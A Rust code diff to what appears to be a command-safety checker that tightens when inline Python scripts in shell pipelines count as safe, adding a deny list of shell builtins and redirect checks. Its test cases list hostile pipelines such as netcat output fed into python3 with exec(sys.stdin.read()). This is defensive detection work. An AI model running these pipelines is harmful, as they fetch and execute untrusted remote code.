@@ -708,17 +708,152 @@ fn is_inline_literal_script(node: &Node, source: &str, kind: Interp) -> bool {
     while let Some(parent) = root.parent() {
         root = parent;
     }
-    if !inline_environment_is_safe(&root, node, &arg_nodes[i - 1], source) {
+    if !inline_command_structure_is_safe(&root, node, source)
+        || !inline_environment_tokens_are_safe(&root, node, &arg_nodes[i - 1], source)
+    {
         return false;
     }
     kind == Interp::Python || args[i..].iter().all(|a| !a.starts_with('-'))
 }
 
-/// Only this stage's already-checked harmless prefixes may assign variables.
-/// Earlier/sibling statements can change inherited startup settings. Literal
-/// argument checks also catch env-style assignments and quoted builtin names;
-/// uncertain shell values cannot establish a safe command environment.
-fn inline_environment_is_safe(node: &Node, stage: &Node, code_arg: &Node, source: &str) -> bool {
+/// The entire program must be one pipeline (or the checked command alone).
+/// Account for anonymous terminators too: even a trailing `;` or `&` disqualifies
+/// the exemption. A final newline does not add a statement.
+fn inline_command_structure_is_safe(root: &Node, stage: &Node, source: &str) -> bool {
+    if root.kind() != "program" || root.has_error() {
+        return false;
+    }
+    let mut statement = None;
+    let mut cursor = root.walk();
+    for child in root.children(&mut cursor) {
+        if child.is_named() {
+            if statement.replace(child).is_some() {
+                return false;
+            }
+        } else if child.kind() != "\n" {
+            return false;
+        }
+    }
+    statement.is_some_and(|node| inline_pipeline_is_safe(&node, stage, source, true))
+}
+
+/// Redirect wrappers only attach literal file redirections to an otherwise
+/// plain command/pipeline. They cannot introduce another executable statement.
+fn inline_pipeline_is_safe(node: &Node, stage: &Node, source: &str, top_level: bool) -> bool {
+    match node.kind() {
+        "redirected_statement" => {
+            let Some(body) = node.child_by_field_name("body") else {
+                return false;
+            };
+            let mut cursor = node.walk();
+            let safe = node.children(&mut cursor).all(|child| {
+                if child == body {
+                    inline_pipeline_is_safe(&child, stage, source, top_level)
+                } else {
+                    inline_file_redirect_is_safe(&child, source)
+                }
+            });
+            safe
+        }
+        "pipeline" if top_level => {
+            let mut cursor = node.walk();
+            let safe = node.children(&mut cursor).all(|child| {
+                if child.is_named() {
+                    inline_pipeline_is_safe(&child, stage, source, false)
+                } else {
+                    child.kind() == "|"
+                }
+            });
+            safe
+        }
+        "command" if !top_level || node == stage => {
+            inline_simple_command_is_safe(node, stage, source)
+        }
+        _ => false,
+    }
+}
+
+fn inline_simple_command_is_safe(node: &Node, stage: &Node, source: &str) -> bool {
+    let Some(name_node) = node.child_by_field_name("name") else {
+        return false;
+    };
+    if name_node.named_child_count() != 1 {
+        return false;
+    }
+    let Some(name) = name_node
+        .named_child(0)
+        .and_then(|word| decode_literal_word(&word, source))
+    else {
+        return false;
+    };
+    let base = name.rsplit('/').next().unwrap_or("");
+    if matches!(
+        base,
+        "eval"
+            | "source"
+            | "."
+            | "cd"
+            | "pushd"
+            | "popd"
+            | "export"
+            | "declare"
+            | "typeset"
+            | "readonly"
+            | "set"
+            | "alias"
+            | "trap"
+            | "exec"
+            | "command"
+            | "builtin"
+            | "local"
+            | "unset"
+    ) {
+        return false;
+    }
+    let mut cursor = node.walk();
+    let safe = node.children(&mut cursor).all(|child| match child.kind() {
+        "command_name" => child == name_node,
+        "variable_assignment" => {
+            node == stage
+                && child.end_byte() <= name_node.start_byte()
+                && is_harmless_assignment(&child, source)
+        }
+        "file_redirect" => inline_file_redirect_is_safe(&child, source),
+        _ => decode_literal_word(&child, source).is_some_and(|value| {
+            // env can reparse -S operands as a new command. Its assignment
+            // arguments are also rejected by the token check below.
+            base != "env" || (!is_assignment_token(&value) && !env_splits_string(&value))
+        }),
+    });
+    safe
+}
+
+fn inline_file_redirect_is_safe(node: &Node, source: &str) -> bool {
+    if node.kind() != "file_redirect" {
+        return false;
+    }
+    let mut cursor = node.walk();
+    let safe = node.children(&mut cursor).all(|child| {
+        if child.is_named() {
+            child.kind() == "file_descriptor" || decode_literal_word(&child, source).is_some()
+        } else {
+            matches!(
+                child.kind(),
+                "<" | ">" | ">>" | "&>" | "&>>" | "<&" | ">&" | ">|" | "<&-" | ">&-"
+            )
+        }
+    });
+    safe
+}
+
+/// Defence in depth after structural validation: retain the existing PYTHON*
+/// and assignment-token checks, including env-style and quoted arguments.
+fn inline_environment_tokens_are_safe(
+    node: &Node,
+    stage: &Node,
+    code_arg: &Node,
+    source: &str,
+) -> bool {
     match node.kind() {
         "variable_assignment" => {
             return node.parent() == Some(*stage)
@@ -761,7 +896,7 @@ fn inline_environment_is_safe(node: &Node, stage: &Node, code_arg: &Node, source
     let mut cursor = node.walk();
     let safe = node
         .children(&mut cursor)
-        .all(|child| inline_environment_is_safe(&child, stage, code_arg, source));
+        .all(|child| inline_environment_tokens_are_safe(&child, stage, code_arg, source));
     safe
 }
 
@@ -1175,6 +1310,9 @@ mod tests {
             "nc host 80 | (cat | python3 -c 'import sys; exec(sys.stdin.read())')",
             "nc host 80 | (cat | cat) | python3",
             "nc host 80 | cat < <(cat | python3)",
+            // Inline scripts in subshell stages no longer qualify: ALLOW -> DENY.
+            "nc host 80 | (cat | python3 -c 'import sys; print(sys.stdin.read())')",
+            "(printf x | nc host 80) | python3 -c 'print(1)'",
         ] {
             assert_remote_flow(command, true);
         }
@@ -1183,8 +1321,6 @@ mod tests {
             "nc host 80 | (cat | printf 'print(1)' | python3)",
             "nc host 80 | (cat | printf 'print(1)') | python3",
             "nc host 80 | (echo 'print(1)' | python3)",
-            "nc host 80 | (cat | python3 -c 'import sys; print(sys.stdin.read())')",
-            "(printf x | nc host 80) | python3 -c 'print(1)'",
             "nc host 80 | cat; printf 'print(1)' | python3",
         ] {
             assert_remote_flow(command, false);
